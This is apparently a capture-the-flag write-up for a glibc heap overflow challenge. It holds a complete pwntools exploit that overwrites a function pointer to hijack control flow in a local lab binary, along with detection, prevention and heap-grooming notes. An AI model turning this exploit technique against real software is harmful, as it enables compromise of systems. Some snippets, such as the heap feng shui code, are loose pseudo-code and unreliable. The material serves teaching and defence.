# Challenge 18: Heap Overflow

## Difficulty: Easy-Medium

## Vulnerability Type: Heap Buffer Overflow

## Description
Classic heap overflow where we can write past the bounds of an allocated buffer, corrupting adjacent heap structures and function pointers.

## Protections
- **NX**: Enabled
- **PIE**: Disabled
- **Canary**: Disabled (doesn't protect heap)
- **RELRO**: Partial

## Vulnerability Analysis

### The Bug
```c
task1->description = malloc(64);  // 64-byte buffer
// ...
read(0, task1->description, 200);  // Reads 200 bytes!
```

We can write 136 bytes past the buffer, corrupting adjacent heap data.

### Memory Layout
```
Heap (simplified):

[task1 struct: description* | handler*]
[task1->description: 64 bytes + heap metadata]
[task2 struct: description* | handler*]  <- Can be corrupted!
[task2->description: 64 bytes + heap metadata]
```

### Exploitation Target
If we overflow task1->description, we can overwrite:
- Heap metadata
- task2 struct
- Specifically: task2->handler function pointer!

## Heap Chunk Structure

### Malloc Chunk Header (glibc)
```c
struct malloc_chunk {
    size_t prev_size;  // 8 bytes (if previous chunk is free)
    size_t size;       // 8 bytes
    // User data starts here
};
```

For allocated chunk:
```
[prev_size][size][user_data...]
```

Size for 64-byte allocation: typically 0x50 (80 bytes total with header)

## Exploitation Strategy

### Step 1: Calculate Overflow Distance
```python
# task1->description is 64 bytes
# Plus heap metadata (16 bytes typically)
# Then task2 struct starts
# task2->handler is at offset 8 in struct (after description*)

overflow_size = 64  # description buffer
overflow_size += 16  # heap metadata for description chunk
overflow_size += 8   # task2->description pointer
# Now we're at task2->handler location
```

### Step 2: Build Payload
```python
payload = b'A' * (64 + 16 + 8)  # Reach task2->handler
payload += p64(admin_handler)    # Overwrite with admin_handler
```

### Complete Exploit
```python
#!/usr/bin/env python3
from pwn import *

elf = ELF('./challenge')
context.binary = elf

if args.REMOTE:
    p = remote('localhost', 9018)
else:
    p = process('./challenge')

# Receive addresses
p.recvuntil(b'Task 1 at: ')
task1 = int(p.recvline().strip(), 16)
p.recvuntil(b'Task 1 description at: ')
task1_desc = int(p.recvline().strip(), 16)
p.recvuntil(b'Task 2 at: ')
task2 = int(p.recvline().strip(), 16)
p.recvuntil(b'Task 2 description at: ')
task2_desc = int(p.recvline().strip(), 16)
p.recvuntil(b'admin_handler at: ')
admin_handler = int(p.recvline().strip(), 16)

log.info(f"task1: {hex(task1)}")
log.info(f"task1->description: {hex(task1_desc)}")
log.info(f"task2: {hex(task2)}")
log.info(f"task2->description: {hex(task2_desc)}")
log.info(f"admin_handler: {hex(admin_handler)}")

# Calculate offset from task1->description to task2->handler
# task2 is at known address, handler is at offset 8
target_offset = task2 + 8 - task1_desc

log.info(f"Overflow offset: {target_offset}")

# Build payload
payload = b'A' * target_offset
payload += p64(admin_handler)

# Edit task1 with overflow
p.sendlineafter(b'Choice: ', b'1')
p.sendafter(b'task 1: ', payload)

# Execute tasks (triggers overwritten handler)
p.sendlineafter(b'Choice: ', b'2')

p.interactive()
```

### Alternative: Blind Overflow
If addresses aren't leaked:
```python
# Typical heap layout with glibc malloc:
# 64-byte alloc = 0x50 chunk size (including header)
# Struct is 16 bytes
# So typically:
# [64 bytes][16 header][8 desc*][8 handler*]

offset = 64 + 16 + 8
payload = b'A' * offset + p64(admin_handler)
```

## Automated Detection

### Static Analysis
- `read()` with size > buffer size
- `strcpy()` without bounds check
- `memcpy()` with unchecked length

### Dynamic Analysis
```bash
# HeapSanitizer (ASAN detects heap overflow)
gcc -fsanitize=address challenge.c -o challenge
./challenge
# Will report: heap-buffer-overflow
```

### Fuzzing
```bash
afl-clang-fast -fsanitize=address challenge.c
afl-fuzz -m none -i in -o out ./challenge
```

## Heap Overflow vs Stack Overflow

| Aspect | Stack Overflow | Heap Overflow |
|--------|---------------|---------------|
| Target | Return addresses | Function pointers, heap metadata |
| Layout | Predictable | Depends on allocations |
| Canary | Protected | Not protected |
| Difficulty | Easier | Harder (need heap layout knowledge) |

## Real-World Examples
- CVE-2014-0160 (Heartbleed): Heap over-read
- CVE-2012-0003: Windows kernel heap overflow
- CVE-2015-3456 (Venom): QEMU heap overflow
- Many browser exploits

## Prevention

### Bounds Checking
```c
// Safe version
size_t len = strlen(user_input);
if (len >= buffer_size) {
    len = buffer_size - 1;
}
memcpy(buffer, user_input, len);
buffer[len] = '\0';
```

### Safe Functions
```c
strncpy(dest, src, sizeof(dest));  // Better than strcpy
strlcpy(dest, src, sizeof(dest));  // Best (if available)
```

### Modern Allocators
- Hardened heap allocators
- Guard pages
- Metadata validation
- Random chunk placement

## Heap Exploitation Techniques

### 1. Function Pointer Overwrite (This Challenge)
Simplest: overwrite nearby function pointer

### 2. Chunk Metadata Corruption
Overwrite size/prev_size to create fake chunks

### 3. Heap Spray
Fill heap with controlled data, increase hit chance

### 4. Partial Overwrite
Overwrite only lower bytes of pointer

## Debugging Tips

### GDB with pwndbg/gef
```gdb
# Before overflow
heap chunks

# After overflow
x/40gx <task1_desc_addr>

# Compare task2 struct
x/2gx <task2_addr>
```

### Visualize Heap
```python
# In pwndbg
vis_heap_chunks
```

## Learning Objectives
- Heap layout understanding
- Buffer overflow beyond the stack
- Heap chunk structures
- Function pointer hijacking on heap
- Difference between stack and heap exploitation

## Advanced Topics

### Heap Feng Shui
Carefully arrange heap allocations to control layout:
```c
// Allocate and free in specific order
// To place target chunk next to overflow source
malloc(size1); free();
malloc(size2); free();
malloc(size1);  // Now positioned correctly
malloc(size2);  // Next to size1
// Overflow size1 -> corrupts size2
```

### Heap Grooming
Prepare heap state before triggering vulnerability

## Further Reading
- "Malloc Des-Maleficarum" (Phantasmal Phantasmagoria)
- glibc malloc internals
- "The Heap: what does malloc() do?" - CS107
- "Pseudomonarchia Jemallocum" - PTMalloc internals
